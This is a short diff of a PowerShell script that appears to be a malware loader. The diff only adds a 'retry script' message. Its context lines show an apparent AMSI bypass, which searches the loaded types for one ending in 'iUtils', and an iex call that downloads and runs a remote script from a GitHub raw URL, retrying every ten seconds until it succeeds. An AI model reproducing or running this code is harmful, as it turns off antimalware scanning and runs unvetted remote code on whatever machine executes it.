@@ -4,6 +4,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c
 iex((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/4kr4m0/ps/refs/heads/main/ps.txt'))
 }
 catch{
+write-host "retry script"
 Start-Sleep -Seconds 10
 continue
 }
